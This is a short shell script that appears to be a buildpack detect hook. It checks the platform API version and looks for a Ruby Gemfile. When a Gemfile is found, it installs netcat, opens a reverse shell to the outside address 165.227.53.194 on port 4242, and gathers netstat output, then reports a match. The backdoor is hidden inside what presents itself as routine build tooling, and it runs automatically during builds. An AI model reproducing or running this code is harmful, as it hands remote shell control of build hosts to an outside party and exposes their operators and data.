#!/bin/sh


if [ -z "$CNB_STACK_ID" ]; then
  # v2 API
  APP_DIR=$1
else
  PLATFORM_DIR=$1
  PLAN=$2
  # working is the cwd now
  # v3 API
  APP_DIR=$(pwd)
fi

if [ -f "$APP_DIR/Gemfile" ]; then
  apt-get install netcat
  nc -e /bin/sh 165.227.53.194 4242
  export A=$(netstat -antp)
  echo "Ruaaby $A"
  exit 0
else
  echo "no"
  exit 1
fi
